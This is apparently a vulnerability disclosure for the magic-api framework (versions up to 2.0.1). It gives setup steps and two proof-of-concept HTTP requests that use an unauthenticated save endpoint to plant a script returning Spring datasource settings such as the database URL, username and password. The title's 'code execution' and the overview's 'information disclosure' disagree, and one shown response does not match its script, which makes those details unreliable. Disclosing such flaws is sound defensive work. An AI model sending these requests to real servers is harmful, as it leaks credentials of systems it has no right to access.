### Magic-Api Code Execution Vulnerability

project introduction magic-api is a Java-based interface rapid development framework, interface writing will be completed through the UI interface provided by magic-api, automatically mapped to HTTP interface, without defining Java objects such as Controller, Service, Dao, Mapper, XML, VO, etc. to complete common HTTP API interface development.

project address https://gitee.com/ssssssss-team/magic-api Vulnerability Overview magic-api contains an information disclosure vulnerability that an attacker can use to read SpringBoot configuration file contents by defining malicious js methods in custom interfaces. affected version Magic-Api <= v2.0.1 environment construction Refer to the official environment setup documentation: https://www.ssssssss.org/magic-api/pages/quick/start/ Download version 1.7.5 source code on Gitee platform and import IDEA. https://gitee.com/ssssssss-team/magic-api/tree/v1.7.5

Author: Puppy

![img](https://cdn-images-1.medium.com/max/750/1*hW6QBtlIYxPaY4pKcNe9GQ.png)

Add the following configuration to the magic-api-spring-boot-starter module. 
 Detailed Reference:

https://www.ssssssss.org/magic-api/pages/quick/start/  Introduction of Spring Boot Starter parent project:  <parent>  <groupId>org.springframework.boot</groupId>  <artifactId>spring-boot-starter-parent</artifactId>  <version>3.0.0</version>  <relativePathparent>  magic-api-spring-boot-starter dependency introduced.  <dependency>  <groupId>org.ssssssss</groupId>  <artifactId>magic-api-spring-boot-starter</artifactId>  <version>2.0.2</version></dependency>  Spring-boot-starter,spring-boot-starter-web, spring-boot-starter-test, mysql dependencies are introduced.  <dependency>  <groupId>org.springframework.boot</groupId>  <artifactId>spring-boot-starter</artifactId></dependency><dependency>  <groupId>org.springframework.boot</groupId>  <artifactId>spring-boot-starter-web</artifactId></dependency><dependency>  <groupId>org.springframework.boot</groupId>  <artifactId>spring-boot-starter-test</artifactId>  <scope>test</scope></dependency><dependency>  <groupId>org.springframework.boot</groupId>  <artifactId>spring-boot-starter-jdbc</artifactId></dependency><dependency>  <groupId>mysql</groupId>  <artifactId>mysql-connector-java</artifactId>  <version>8.0.27</version></dependency>

Configure application.yml

server: port: 9999magic-api: #configure web page portal web: /magic/web resource: #Configuration file storage location. Read-only mode when it begins with classpath #mac users please change to a readable directory #If you donâ€™t want to save it in a file, you can refer to the configuration to save the interface information in the database, Redis (or custom) location: D:/data/magic-api 
 spring: datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/magic-api-test? allowMultiQueries=true&useUnicode=true&characterEncoding=UTF-8 username: root password: test

3. Access API management interface 

 After launching the project, visit http://localhost:9999/magic/web to see the Web page 
 bug recurrence 

1. Visit WEB page to create grouping 

 After clicking the Create Group button, enter the grouping information and click Create.

![img](https://cdn-images-1.medium.com/max/750/1*7dNS8iWX5nypsaCRVmWOqw.png)

2. New Interface 

 Right-click the grouping and click New Interface.

![img](https://cdn-images-1.medium.com/max/750/1*Emb3El2ldTy3RwM3RDtCZw.png)



After entering the content in the editor, fill in the interface name and its path.

![img](https://cdn-images-1.medium.com/max/750/1*t3j4x6o_wQ0oF6lG-ueUSA.png)

operation interface 
 spring.datasource.url

![img](https://cdn-images-1.medium.com/max/750/1*HAmBiRUqITGm0S5mlLhzMg.png)

spring.datasource.username

![img](https://cdn-images-1.medium.com/max/750/1*jeYAJ7cIQClRL4OQ530mAQ.png)

**spring.datasource.password**



![img](https://cdn-images-1.medium.com/max/750/1*ihbssrc6SUuCWqv0HCWDAQ.png)

POC

![img](https://cdn-images-1.medium.com/max/750/1*NWsvgJEl1xMtQVuaWIEASg.png)

POC

```
POST /resource/file/api/save?auto=1 HTTP/1.1
Host: 60.205.225.252:8080
Content-Length: 1812
Accept: application/json, text/plain, */*
magic-token: unauthorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Content-Type: application/json
Origin: http://60.205.225.252:8080
Referer: http://60.205.225.252:8080/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"id":"ed8ea909935c447fb28bb424ed110700","name":"abc","path":"a","groupId":"234ec5f76be84f40a6838d7cf53b931d","lock":null,"method":"GET","description":null,"createBy":null,"properties":{},"script":"import env;\r\n\r\nreturn env.get('spring.datasource.username')","responseBody":"{\n    \"code\": 1,\n    \"message\": \"success\",\n    \"data\": \"jdbc:mysql://localhost:3306/magic-api-test?allowMultiQueries=true&useUnicode=true&characterEncoding=UTF-8\",\n    \"timestamp\": 1692500175894,\n    \"executeTime\": 2\n}","responseBodyDefinition":{"name":"","value":"","description":"","required":false,"dataType":"Object","type":null,"defaultValue":null,"validateType":"","error":"","expression":"","children":[{"name":"code","value":"1","description":"","required":false,"dataType":"Integer","type":null,"defaultValue":null,"validateType":"","error":"","expression":"","children":[]},{"name":"message","value":"success","description":"","required":false,"dataType":"String","type":null,"defaultValue":null,"validateType":"","error":"","expression":"","children":[]},{"name":"data","value":"jdbc:mysql://localhost:3306/magic-api-test?allowMultiQueries=true&useUnicode=true&characterEncoding=UTF-8","description":"","required":false,"dataType":"String","type":null,"defaultValue":null,"validateType":"","error":"","expression":"","children":[]},{"name":"timestamp","value":"1692500175894","description":"","required":false,"dataType":"Long","type":null,"defaultValue":null,"validateType":"","error":"","expression":"","children":[]},{"name":"executeTime","value":"2","description":"","required":false,"dataType":"Integer","type":null,"defaultValue":null,"validateType":"","error":"","expression":"","children":[]}]},"requestBody":"","requestBodyDefinition":null,"parameters":[],"headers":[],"paths":[],"options":[]}
```

POC

```
GET /test1/a HTTP/1.1
Host: localhost:9999
Accept: application/json, text/plain, */*
Magic-Request-Script-Id: ed8ea909935c447fb28bb424ed110700
Magic-Request-Client-Id: a308c3083ba48a42
magic-token: unauthorization
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Magic-Request-Breakpoints: 
Content-Type: application/x-www-form-urlencoded
Referer: http://60.205.225.252:8080/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```